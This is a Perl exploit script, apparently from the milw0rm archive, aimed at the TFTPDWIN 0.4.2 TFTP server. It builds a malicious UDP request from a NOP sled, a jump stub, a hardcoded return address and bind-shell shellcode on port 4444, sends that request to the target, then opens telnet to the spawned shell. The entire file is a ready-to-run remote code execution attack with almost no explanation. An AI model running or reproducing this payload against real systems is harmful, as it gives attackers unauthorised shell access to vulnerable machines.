#!/usr/bin/perl -w
use IO::Socket;

if(!($ARGV[1]))
{
 print \"Usage: tftpdwin-0-4-2.pl <target host> <port>\\n\\n\";
 exit;
}

$victim = IO::Socket::INET->new(Proto=>\'udp\',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die \"Cannot connect to $ARGV[0] sulla porta $ARGV[1]\";

my $nop0=\"\\x90\"x15;

#8BC3           MOV EAX,EBX
#66:05 1201     ADD AX,112
#50             PUSH EAX
#C3             RETN

my $asm=\"\\x8b\\xc3\\x66\\x05\\x12\\x01\\x50\\xc3\";

my $nop=\"\\x90\"x57;

my $nop1=\"\\x90\"x7;

my $eip=\"\\x42\\xfb\\x61\\x40\";# pop ebp,ret in tftpd.exe
#my $eip=\"B\"x4;

#A binary translation of NGS Writing Small Shellcode by Dafydd Stuttard with only two little differences
#1)bind port, in this exploit is 4444 in the original shellcode was 6666
#2)4 bytes added to the shellcode in order not to see the window of cmd.exe on remote host
$shellcode = 
\"\\x59\\x81\\xc9\\xd3\\x62\\x30\\x20\\x41\\x43\\x4d\\x64\".
\"\\x64\\x99\\x96\\x8D\\x7E\\xE8\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\".
\"\\x8B\\x09\\x8B\\x69\\x08\\xB6\\x03\\x2B\\xE2\\x66\\xBA\\x33\\x32\\x52\\x68\\x77\".
\"\\x73\\x32\\x5F\\x54\\xAC\\x3C\\xD3\\x75\\x06\\x95\\xFF\\x57\\xF4\\x95\\x57\\x60\".
\"\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\".
\"\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\xAC\\x34\\x71\\x2A\\xD0\\x3C\\x71\\x75\\xF7\".
\"\\x3A\\x54\\x24\\x1C\\x75\\xEA\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\".
\"\\x59\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3B\\xF7\\x75\\xB4\".
\"\\x5E\\x54\\x6A\\x02\\xAD\\xFF\\xD0\\x88\\x46\\x13\\x8D\\x48\\x30\\x8B\\xFC\\xF3\".
\"\\xAB\\x40\\x50\\x40\\x50\\xAD\\xFF\\xD0\\x95\\xB8\\x02\\xFF\\x11\\x5c\\x32\\xE4\".
\"\\x50\\x54\\x55\\xAD\\xFF\\xD0\\x85\\xC0\\x74\\xF8\\xFE\\x44\\x24\\x2D\\xFE\\x44\".
\"\\x24\\x2c\\x83\\xEF\\x6C\\xAB\\xAB\\xAB\\x58\\x54\\x54\\x50\\x50\\x50\\x54\\x50\".
\"\\x50\\x56\\x50\\xFF\\x56\\xE4\\xFF\\x56\\xE8\";

$exploit = \"\\x00\\x01\" . $nop0 .$asm.$nop. $shellcode. $nop1 .$eip. \"\\x00\\x6e\\x65\\x74\\x61\\x73\\x63\\x69\\x69\\x00\";

print $victim $exploit;

print \" + Malicious request sent ...\\n\";

sleep(2);

print \"Done.\\n\";

close($victim);
$host = $ARGV[0];
print \" + connect to 4444 port of $host ...\\n\";
sleep(3);
system(\"telnet $host 4444\");
exit;

# milw0rm.com [2007-01-15]
